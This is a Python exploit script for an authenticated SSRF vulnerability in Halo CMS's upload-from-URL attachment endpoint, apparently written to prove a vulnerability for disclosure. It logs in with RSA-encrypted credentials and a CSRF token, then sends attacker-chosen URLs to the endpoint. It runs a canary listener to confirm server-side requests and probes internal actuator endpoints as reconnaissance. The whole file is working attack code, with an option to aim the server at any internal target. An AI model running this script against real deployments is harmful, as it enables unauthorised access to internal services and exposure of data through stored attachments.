#!/usr/bin/env python3
"""
VULN-002: Authenticated SSRF in Halo CMS Upload from External URL
Exploit for CVE-TBD / CVSS 8.5 High

Usage:
    python3 exploit.py http://target-halo:8090 --username admin --password Pa$$W0rd!
    python3 exploit.py http://target-halo:8090 --username admin --password Pa$$W0rd! --target http://127.0.0.1:8080/admin
    python3 exploit.py http://target-halo:8090 --username admin --password Pa$$W0rd! --canary-port 9999
"""

import requests
import sys
import argparse
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
import time
import json
import base64
from bs4 import BeautifulSoup
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes

class SSRFCanary(BaseHTTPRequestHandler):
    hits = []
    
    def do_HEAD(self):
        self.hits.append({'method': 'HEAD', 'path': self.path, 'ip': self.client_address[0], 'time': time.time()})
        print(f"[+] SSRF HIT (HEAD): {self.client_address[0]} -> {self.path}")
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
    
    def do_GET(self):
        self.hits.append({'method': 'GET', 'path': self.path, 'ip': self.client_address[0], 'time': time.time()})
        print(f"[+] SSRF HIT (GET): {self.client_address[0]} -> {self.path}")
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(b'SSRF_SUCCESS_CONTENT')
    
    def log_message(self, format, *args): pass

def start_canary(port):
    server = HTTPServer(('0.0.0.0', port), SSRFCanary)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server

def get_rsa_public_key(session, halo_url):
    """Get RSA public key for password encryption"""
    try:
        # The actual endpoint from PublicKeyRouteBuilder.java line 26
        response = session.get(f"{halo_url}/login/public-key")
        if response.status_code == 200:
            key_data = response.json()
            # The actual field name from PublicKeyRouteBuilder.java line 44
            public_key = key_data.get('base64Format', '')
            if public_key:
                print(f"[+] Found RSA public key")
                return public_key
    except Exception as e:
        print(f"[!] Error getting public key: {e}")
    return None

def encrypt_password(password, public_key_str):
    """Encrypt password using RSA public key"""
    try:
        public_key_bytes = base64.b64decode(public_key_str)
        public_key = serialization.load_der_public_key(public_key_bytes)
        encrypted = public_key.encrypt(password.encode(), padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        ))
        return base64.b64encode(encrypted).decode()
    except Exception as e:
        print(f"[-] Password encryption failed: {e}")
        return None

def get_csrf_token(session, halo_url):
    """Extract CSRF token from login page"""
    try:
        response = session.get(f"{halo_url}/console")
        soup = BeautifulSoup(response.text, 'html.parser')
        csrf_input = soup.find('input', {'name': '_csrf'})
        if csrf_input:
            return csrf_input.get('value')
    except:
        pass
    return None

def authenticate(session, halo_url, username, password):
    """Authenticate with Halo CMS"""
    print(f"[*] Authenticating as {username}...")
    
    # Get RSA public key
    public_key = get_rsa_public_key(session, halo_url)
    
    # Get CSRF token
    csrf_token = get_csrf_token(session, halo_url)
    if not csrf_token:
        print("[-] Failed to get CSRF token")
        return False
    
    # Prepare login data - Halo REQUIRES RSA encryption per source code
    if not public_key:
        print("[-] RSA public key required for Halo authentication")
        return False
        
    encrypted_password = encrypt_password(password, public_key)
    if not encrypted_password:
        print("[-] Password encryption failed")
        return False
    print("[*] Using RSA-encrypted password")
    
    # Login with simple redirect detection
    login_data = {
        'username': username,
        'password': encrypted_password,
        '_csrf': csrf_token
    }
    
    response = session.post(f"{halo_url}/login", data=login_data, allow_redirects=False)
    
    print(f"[*] Login response: {response.status_code}")
    
    # Simple success detection - any 302 redirect is likely success
    if response.status_code == 302:
        print(f"[+] Authentication successful (302 redirect)")
        return True
    elif response.status_code == 200 and ('dashboard' in response.text.lower() or 'console' in response.text.lower()):
        print(f"[+] Authentication successful (200 with dashboard)")
        return True
    
    print(f"[-] Authentication failed: {response.status_code}")
    return False

def exploit_ssrf(session, halo_url, target_url):
    """Execute SSRF attack via upload-from-url endpoint"""
    endpoint = f"{halo_url}/apis/uc.api.storage.halo.run/v1alpha1/attachments/-/upload-from-url"
    
    try:
        print(f"[*] Targeting: {endpoint}")
        print(f"[*] SSRF URL: {target_url}")
        
        payload = {
            'url': target_url,
            'filename': 'ssrf-test.txt'
        }
        
        response = session.post(endpoint, json=payload, timeout=15)
        
        print(f"[*] Status: {response.status_code}")
        
        if response.status_code == 201:
            print(f"[+] SSRF SUCCESS: 201 attachment created")
            try:
                result = response.json()
                print(f"[+] Attachment saved: {result.get('spec', {}).get('displayName', 'unknown')}")
                return True
            except:
                return True
        elif response.status_code == 400:
            print(f"[+] SSRF ATTEMPTED: 400 response (server made request)")
            return True
        else:
            print(f"[-] Response: {response.status_code}")
            if response.text:
                print(f"[-] Error: {response.text[:200]}")
            return False
            
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(description='Halo CMS Upload SSRF Exploit')
    parser.add_argument('halo_url', help='Halo CMS URL (e.g., http://localhost:8090)')
    parser.add_argument('--username', required=True, help='Halo username')
    parser.add_argument('--password', required=True, help='Halo password')
    parser.add_argument('--target', help='SSRF target URL', default=None)
    parser.add_argument('--canary-port', type=int, help='Local canary server port', default=8889)
    
    args = parser.parse_args()
    
    halo_url = args.halo_url.rstrip('/')
    
    print("=" * 60)
    print("Halo CMS Upload SSRF Exploit - VULN-002")
    print("Authenticated Server-Side Request Forgery")
    print("=" * 60)
    
    # Setup session
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })
    
    # Authenticate
    if not authenticate(session, halo_url, args.username, args.password):
        print("[-] Authentication failed - cannot proceed")
        return 1
    
    if args.target:
        # Custom target
        print("[*] Custom SSRF target mode")
        success = exploit_ssrf(session, halo_url, args.target)
    else:
        # Canary server proof
        print("[*] Starting canary server for SSRF proof...")
        canary = start_canary(args.canary_port)
        print(f"[*] Canary listening on port {args.canary_port}")
        
        # Target canary via Docker networking  
        canary_url = f"http://host.docker.internal:{args.canary_port}/ssrf-proof"
        
        SSRFCanary.hits = []  # Reset
        success = exploit_ssrf(session, halo_url, canary_url)
        
        time.sleep(3)  # Wait for both HEAD and GET requests
        
        if SSRFCanary.hits:
            print(f"[+] CANARY HIT CONFIRMED: {len(SSRFCanary.hits)} requests")
            for hit in SSRFCanary.hits:
                print(f"    {hit['method']} {hit['path']} from {hit['ip']}")
            success = True
        else:
            print("[-] No canary hits detected")
    
    # Quick internal recon
    print("\n[*] Testing internal services...")
    internal_targets = [
        "http://127.0.0.1:8090/actuator/health",
        "http://localhost:8090/actuator/info"
    ]
    
    for target in internal_targets:
        exploit_ssrf(session, halo_url, target)
    
    print("\n" + "=" * 60)
    if success:
        print("[+] SSRF VULNERABILITY CONFIRMED!")
        print("[+] Authenticated attacker can proxy requests through server")
        print("[!] Risk: Internal network access, content exfiltration to attachments")
    else:
        print("[-] SSRF not confirmed")
    print("=" * 60)
    
    return 0 if success else 1

if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(1)